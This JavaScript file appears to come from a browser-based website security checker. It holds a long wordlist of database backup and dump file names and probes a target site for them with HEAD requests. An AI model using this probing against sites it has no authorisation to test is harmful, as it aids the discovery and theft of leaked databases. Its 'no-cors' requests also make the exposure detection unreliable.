// Database exposure check common file list
const databaseFilesList = [
    'db.sql', 'database.sql', 'backup.sql', 'dump.sql', 'backup-db.sql', 
    'db_backup.sql', 'backup_database.sql', 'wordpress.sql', 'site.sql', 
    'data.sql', 'mysql.sql', 'database_backup.sql', 'db_bak.sql', 'db_save.sql', 
    'db_dump.sql', 'db_export.sql', 'sql_dump.sql', 'sql_backup.sql', 
    'old_db.sql', 'old_database.sql', 'db_old.sql', 'wp_backup.sql', 
    'wp_database.sql', 'export.sql', 'dumpfile.sql', 'db-copy.sql', 
    'database_copy.sql', 'database-final.sql', 'latest_backup.sql', 
    'backup-final.sql', 'backup-latest.sql', 'backup_old.sql', 'backup_new.sql', 
    'saved_db.sql', 'mysql_backup.sql', 'mysql_dump.sql', 'wpdump.sql', 
    'dbfull.sql', 'full_backup.sql', 'website_backup.sql', 'backup_website.sql', 
    'backup_wp.sql', 'bak.sql', 'backup.bak', 'database.bak', 'db.bak', 
    'db_old.bak', 'db_dump.bak', 'db.sql.zip', 'db.sql.rar', 'db.sql.tar.gz', 
    'db.sql.7z', 'database.sql.zip', 'database.sql.rar', 'database.sql.tar.gz', 
    'backup.sql.zip', 'backup.sql.rar', 'backup.sql.tar.gz', 'dump.sql.zip', 
    'dump.sql.rar', 'dump.sql.tar.gz', 'backup-db.sql.zip', 'db_backup.sql.rar', 
    'wordpress.sql.zip', 'wordpress.sql.rar', 'site.sql.zip', 'data.sql.tar.gz', 
    'mysql.sql.zip', 'mysql.sql.rar', 'db_backup.sql.7z', 'backup_database.sql.zip', 
    'database_backup.sql.rar', 'db_bak.sql.tar.gz', 'db_save.sql.zip', 
    'db_dump.sql.rar', 'db_export.sql.7z', 'sql_dump.sql.zip', 'sql_backup.sql.rar', 
    'old_db.sql.zip', 'old_database.sql.rar', 'db_old.sql.tar.gz', 
    'wp_backup.sql.zip', 'wp_database.sql.rar', 'export.sql.zip', 
    'dumpfile.sql.rar', 'db-copy.sql.7z', 'database_copy.sql.zip', 
    'database-final.sql.rar', 'latest_backup.sql.tar.gz', 'backup-final.sql.zip', 
    'backup-latest.sql.rar', 'backup_old.sql.tar.gz', 'backup_new.sql.zip', 
    'saved_db.sql.rar', 'mysql_backup.sql.7z', 'mysql_dump.sql.zip', 
    'wpdump.sql.rar', 'dbfull.sql.zip', 'full_backup.sql.rar', 
    'website_backup.sql.7z', 'backup_website.sql.zip', 'backup_wp.sql.rar'
];

// Helper utility functions for security checks
function showLoading(message) {
    // Remove any existing loading indicators
    $('.loading-indicator').remove();
    
    // Create new loading indicator
    const loadingDiv = $('<div class="loading-indicator cyberpunk-border" style="padding: 10px; margin-top: 10px; background-color: #121212; color: var(--neon-blue);">' +
        '<i class="fa fa-spinner fa-spin"></i> ' + message +
        '</div>');
    
    // Add to the page after the URL field
    $('#url_field').after(loadingDiv);
}

function hideLoading() {
    // Remove loading indicator
    $('.loading-indicator').fadeOut(300, function() {
        $(this).remove();
    });
}

function clearResults() {
    // Remove any existing results
    $('.result-container').remove();
    $('.wp-check-results').remove();
    $('.wp-version-results').remove();
    $('.loading-indicator').remove();
}

function showResultMessage(message, type) {
    // Map type to cyberpunk color
    let color = 'var(--neon-blue)';
    switch(type) {
        case 'danger':
            color = 'var(--neon-pink)';
            break;
        case 'warning':
            color = 'var(--neon-yellow)';
            break;
        case 'success':
            color = 'var(--neon-green)';
            break;
    }
    
    // Create message div
    const messageDiv = $('<div class="result-message cyberpunk-border" style="padding: 10px; margin-top: 10px; background-color: #121212; color: ' + color + ';">' +
        message +
        '</div>');
    
    // Add to the page after the URL field
    $('#url_field').after(messageDiv);
    
    // Auto-remove after 5 seconds
    setTimeout(() => {
        messageDiv.fadeOut(300, function() {
            $(this).remove();
        });
    }, 5000);
}

function normalizeUrl(url) {
    if (!url) return null;
    
    // Add http:// if protocol is missing
    if (!url.match(/^https?:\/\//i)) {
        url = 'http://' + url;
    }
    
    // Remove trailing slash for consistency
    url = url.replace(/\/$/, '');
    
    try {
        // Test if URL is valid
        new URL(url);
        return url;
    } catch(e) {
        return null;
    }
}

// Function to check database exposure
function checkDatabaseExposure() {
    // Get URL from the input field
    let url = $('#url_field').val();
    if (!url) {
        // If URL field is empty, try to load it from the current tab
        loadUrl();
        return;
    }

    // Normalize URL
    url = normalizeUrl(url);
    if (!url) {
        showResultMessage('Invalid URL format', 'danger');
        return;
    }

    // Clear previous results
    clearResults();
    
    // Show loading indicator
    showLoading('Checking for exposed database files...');

    // Create result container
    let resultContainer = $('<div class="wp-check-results cyberpunk-border result-container" style="background-color: #121212;"></div>');
    $('#url_field').after(resultContainer);

    // Create the results table
    let resultTable = $('<table class="table table-bordered cyberpunk-table" style="background-color: #121212;">' +
        '<thead style="background-color: #1a1a2e;"><tr>' +
        '<th style="background-color: #1a1a2e; color: var(--neon-blue);">File</th>' +
        '<th style="background-color: #1a1a2e; color: var(--neon-blue);">Status</th>' +
        '<th style="background-color: #1a1a2e; color: var(--neon-blue);">Details</th>' +
        '</tr></thead>' +
        '<tbody style="background-color: #1e1e2f;"></tbody>' +
        '</table>');

    resultContainer.append('<h3 class="neon-text" style="color: var(--neon-green);">Database Exposure Check Results</h3>');
    resultContainer.append('<p>Target: <span class="neon-text" style="color: var(--neon-blue);">' + url + '</span></p>');
    resultContainer.append('<p style="color: #e0e0e0;">Checking for exposed database files (backup files, SQL dumps, etc.)...</p>');
    resultContainer.append(resultTable);

    // Create a smaller batch of files to check first for faster initial results
    const priorityFiles = [
        'db.sql', 'database.sql', 'backup.sql', 'dump.sql', 'wordpress.sql', 
        'site.sql', 'data.sql', 'mysql.sql', 'db.sql.zip', 'database.sql.zip',
        'backup.sql.zip', 'wp_backup.sql', 'db_backup.sql'
    ];
    
    // Set for tracking completed files
    let checkedFiles = new Set();
    let foundVulnerabilities = false;
    
    // Function to add a row to the results table
    function addResultRow(file, status, details, rowClass, bgColor) {
        const row = $('<tr class="' + rowClass + '" style="background-color: ' + bgColor + ';">' +
            '<td style="background-color: ' + bgColor + '; color: #e0e0e0;">' + file + '</td>' +
            '<td style="background-color: ' + bgColor + '; color: #e0e0e0;">' + status + '</td>' +
            '<td style="background-color: ' + bgColor + '; color: #e0e0e0;">' + details + '</td>' +
            '</tr>');
        resultTable.find('tbody').append(row);
    }
    
    // Function to update the status summary
    function updateStatusSummary() {
        // Remove old summary if exists
        $('.status-summary').remove();
        
        // Create summary div
        const summaryDiv = $('<div class="status-summary" style="margin-top: 15px; padding: 10px; background-color: #1a1a2e; color: #e0e0e0;"></div>');
        
        if (foundVulnerabilities) {
            summaryDiv.append('<h4 style="color: var(--neon-pink);">SECURITY RISK DETECTED!</h4>');
            summaryDiv.append('<p>Database files are exposed! This is a significant security risk.</p>');
            summaryDiv.append('<div style="padding: 10px; background-color: #301010; border-left: 3px solid var(--neon-pink); margin-top: 10px;">' +
                '<h5 style="color: var(--neon-pink);">Recommendations:</h5>' +
                '<ul>' +
                '<li>Remove or secure the exposed database files immediately</li>' +
                '<li>Implement proper access controls to prevent unauthorized access</li>' +
                '<li>Use .htaccess or similar mechanisms to block access to sensitive files</li>' +
                '<li>Check for data breach as your database might have been compromised</li>' +
                '</ul>' +
                '</div>');
        } else {
            // Only show completed message when fully done
            if (checkedFiles.size >= databaseFilesList.length) {
                summaryDiv.append('<h4 style="color: var(--neon-green);">No Exposed Database Files Found</h4>');
                summaryDiv.append('<p>No database files were found to be exposed. This is good for security.</p>');
                summaryDiv.append('<div style="padding: 10px; background-color: #103010; border-left: 3px solid var(--neon-green); margin-top: 10px;">' +
                    '<h5 style="color: var(--neon-green);">Best Practices:</h5>' +
                    '<ul>' +
                    '<li>Regularly check for exposed sensitive files</li>' +
                    '<li>Keep database backups in secure, non-public locations</li>' +
                    '<li>Implement proper access controls for all sensitive resources</li>' +
                    '<li>Use encryption for sensitive data and database backups</li>' +
                    '</ul>' +
                    '</div>');
            }
        }
        
        resultContainer.append(summaryDiv);
    }
    
    // First, check the priority files for faster initial results
    let checkedPriorityFiles = 0;
    
    priorityFiles.forEach(file => {
        const fullUrl = url + '/' + file;
        checkedFiles.add(file);
        
        fetch(fullUrl, { method: 'HEAD', mode: 'no-cors' })
            .then(response => {
                let status = 'Safe';
                let details = 'File not accessible';
                let rowClass = 'success';
                let bgColor = 'rgba(0, 40, 0, 0.8)';
                
                // Check response status
                if (response.ok) {
                    status = 'EXPOSED';
                    details = 'Database file is publicly accessible!';
                    rowClass = 'danger';
                    bgColor = 'rgba(40, 0, 0, 0.8)';
                    foundVulnerabilities = true;
                }
                
                // Add result to table
                addResultRow(file, status, details, rowClass, bgColor);
                
                checkedPriorityFiles++;
                if (checkedPriorityFiles === priorityFiles.length) {
                    // Priority files done, check the rest
                    checkRemainingFiles();
                    
                    // Update summary based on priority results
                    updateStatusSummary();
                }
            })
            .catch(error => {
                // Some errors might actually be due to CORS, not 404s
                // We'll treat them as potentially unsafe but indeterminate
                addResultRow(file, 'Unknown', 'Could not determine status', 'warning', 'rgba(40, 40, 0, 0.8)');
                
                checkedPriorityFiles++;
                if (checkedPriorityFiles === priorityFiles.length) {
                    // Priority files done, check the rest
                    checkRemainingFiles();
                }
            });
    });
    
    // Function to check the remaining files
    function checkRemainingFiles() {
        // Get the remaining files
        const remainingFiles = databaseFilesList.filter(file => !checkedFiles.has(file));
        
        // Create batches to avoid overwhelming the browser
        const batchSize = 10;
        const batches = [];
        
        for (let i = 0; i < remainingFiles.length; i += batchSize) {
            batches.push(remainingFiles.slice(i, i + batchSize));
        }
        
        // Process batches sequentially
        let currentBatch = 0;
        
        function processBatch() {
            if (currentBatch >= batches.length) {
                // All batches processed
                hideLoading();
                updateStatusSummary();
                return;
            }
            
            const batch = batches[currentBatch];
            let completedInBatch = 0;
            
            // Update loading message
            const totalChecked = checkedFiles.size;
            const percentComplete = Math.floor((totalChecked / databaseFilesList.length) * 100);
            showLoading(`Checking for exposed database files... ${percentComplete}% complete`);
            
            batch.forEach(file => {
                const fullUrl = url + '/' + file;
                checkedFiles.add(file);
                
                fetch(fullUrl, { method: 'HEAD', mode: 'no-cors' })
                    .then(response => {
                        let status = 'Safe';
                        let details = 'File not accessible';
                        let rowClass = 'success';
                        let bgColor = 'rgba(0, 40, 0, 0.8)';
                        
                        // Check response status
                        if (response.ok) {
                            status = 'EXPOSED';
                            details = 'Database file is publicly accessible!';
                            rowClass = 'danger';
                            bgColor = 'rgba(40, 0, 0, 0.8)';
                            foundVulnerabilities = true;
                            
                            // For exposed files, move them to the top of the table
                            const newRow = $('<tr class="' + rowClass + '" style="background-color: ' + bgColor + ';">' +
                                '<td style="background-color: ' + bgColor + '; color: #e0e0e0;">' + file + '</td>' +
                                '<td style="background-color: ' + bgColor + '; color: #e0e0e0;">' + status + '</td>' +
                                '<td style="background-color: ' + bgColor + '; color: #e0e0e0;">' + details + '</td>' +
                                '</tr>');
                            resultTable.find('tbody').prepend(newRow);
                            
                            // Update status summary immediately when finding vulnerabilities
                            updateStatusSummary();
                        } else {
                            // For safe files, add them to the bottom
                            addResultRow(file, status, details, rowClass, bgColor);
                        }
                        
                        completedInBatch++;
                        if (completedInBatch === batch.length) {
                            currentBatch++;
                            setTimeout(processBatch, 100); // Small delay between batches
                        }
                    })
                    .catch(error => {
                        addResultRow(file, 'Unknown', 'Could not determine status', 'warning', 'rgba(40, 40, 0, 0.8)');
                        
                        completedInBatch++;
                        if (completedInBatch === batch.length) {
                            currentBatch++;
                            setTimeout(processBatch, 100);
                        }
                    });
            });
        }
        
        // Start processing batches
        processBatch();
    }
}
